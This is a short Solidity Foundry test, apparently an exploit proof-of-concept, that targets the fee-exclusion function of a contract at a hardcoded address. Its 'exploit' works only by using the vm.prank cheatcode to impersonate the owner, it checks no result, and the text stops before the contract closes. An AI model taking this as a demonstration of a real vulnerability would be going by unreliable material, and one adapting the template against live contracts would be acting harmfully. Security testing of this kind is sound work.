pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    function excludeFromFee(address) external;
    function isExcludedFromFee(address) external view returns (bool);
    function owner() external view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        ITarget instance = ITarget(TARGET);
        assertFalse(instance.isExcludedFromFee(attacker));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        ITarget instance = ITarget(TARGET);
        address owner = instance.owner();
        vm.prank(owner);
        instance.excludeFromFee(attacker);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
